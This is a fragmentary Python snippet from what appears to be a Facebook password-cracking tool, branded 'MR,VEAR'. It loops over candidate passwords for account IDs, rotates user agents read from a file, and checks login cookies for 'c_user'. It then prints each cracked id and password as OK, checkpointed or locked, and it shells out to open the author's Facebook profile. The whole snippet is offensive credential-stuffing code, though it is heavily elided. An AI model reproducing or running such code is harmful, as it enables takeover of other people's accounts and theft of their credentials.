...
try:
    ...
    os.system('curl https://www.facebook.com/vear.ahmad.545?mibextid=ZbWKwL')
...
def uaku():
    ...
    try:
        ...
        ua=open('.MR,VEAR-agents.txt','r').read().splitlines()
...
os.system('xdg-open https://www.facebook.com/vear.ahmad.545?mibextid=ZbWKwL')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\033[1;32m[MR,VEAR-,OK-💚]  ' +cid+ ' | ' +ps+    '\033[0;97m')
                ...
                print('\33[1;31m[MR,VEAR-CP-💔]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                print('\33[1;31m[MR,VEAR-Lock💔]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
